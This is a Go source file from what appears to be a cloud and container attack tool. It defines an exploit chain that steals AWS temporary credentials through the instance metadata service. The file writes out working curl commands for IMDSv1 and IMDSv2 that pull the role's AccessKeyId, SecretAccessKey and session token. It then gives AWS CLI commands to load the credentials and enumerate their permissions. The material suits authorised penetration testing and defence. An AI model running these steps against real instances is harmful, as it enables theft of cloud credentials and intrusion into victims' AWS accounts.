package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// imdsAwsCreds — IMDS reachability + AWS metadata yields temporary STS
// credentials with the role attached to the underlying instance/node.
// On EKS this is often the node role; can be a serious blast radius
// extender.
type imdsAwsCreds struct{ exploit.Base }

func (c *imdsAwsCreds) Matches(results []check.Result) *exploit.Match {
	if !exploit.HasFailedID(results, "cloud.imds.reachable") {
		return nil
	}
	conf := "medium"
	if exploit.EvidenceContains(results, "cloud.imds.reachable", "AWS") {
		conf = "high"
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"cloud.imds.reachable"},
		Confidence: conf,
	}
}

func (c *imdsAwsCreds) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title: "Probe IMDSv1 first (fastest signal)",
			Command: `curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
			Note:    "If this returns a role name, IMDSv1 is enabled and STS creds are one curl away.",
		},
		{
			Title: "Try IMDSv2 (token-based)",
			Command: `TOK=$(curl -s -X PUT \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 60" \
    http://169.254.169.254/latest/api/token)
curl -s -H "X-aws-ec2-metadata-token: $TOK" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
			Note: "Required when IMDSv1 is blocked. Hop-limit-1 nodes will refuse if you're behind too many hops.",
		},
		{
			Title: "Pull the actual STS credentials",
			Command: `ROLE=$(curl -s --max-time 2 \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s --max-time 2 \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"`,
			Note: "Returns AccessKeyId, SecretAccessKey, Token. Plug these into ~/.aws/credentials and use the AWS CLI.",
		},
		{
			Title: "Identify what the credentials can do",
			Command: `aws sts get-caller-identity
aws iam list-attached-role-policies --role-name "$ROLE" 2>/dev/null
aws iam simulate-principal-policy \
    --policy-source-arn "$(aws sts get-caller-identity --query Arn --output text)" \
    --action-names s3:ListBuckets ec2:DescribeInstances 2>/dev/null`,
			Note: "Equivalent of K8s' `auth can-i` for AWS IAM.",
		},
	}
}

func init() {
	exploit.Register(&imdsAwsCreds{Base: exploit.Base{
		IDValue:       "chain.imds_aws_creds",
		NameValue:     "IMDS → STS credentials",
		GoalValue:     "Steal temporary AWS credentials from the node/instance role via IMDS.",
		RiskValue:     exploit.RiskActiveRead,
		SeverityValue: check.SeverityHigh,
		ReferencesValue: []string{
			"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
			"https://attack.mitre.org/techniques/T1552/005/",
		},
		AttackValue: []string{"T1552/005"},
	}})
}
